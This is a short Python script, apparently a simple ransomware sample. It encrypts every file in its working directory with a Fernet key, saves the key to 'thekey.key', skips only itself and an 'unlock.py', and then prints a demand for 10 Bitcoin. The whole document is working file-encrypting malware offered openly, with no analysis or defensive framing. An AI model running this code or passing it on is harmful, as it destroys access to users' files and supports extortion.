#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

def auto_run():
	files=[]

	for file in os.listdir():
		if file == "ransom.py" or file == "thekey.key" or file =="unlock.py":
			continue
		if os.path.isfile(file):
			files.append(file)

	print(files)

	key = Fernet.generate_key()

	with open("thekey.key", "wb") as thekey:
		thekey.write(key)

	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()
		contents_encrypted = Fernet(key).encrypt(contents)
		with open(file, "wb") as thefile:
			thefile.write(contents_encrypted)

	print("Your files have been encrypted!! Send me 10 Bitcoin and 1 SnackPack or We will destroy your files")

if __name__ == '__main__':
    auto_run()
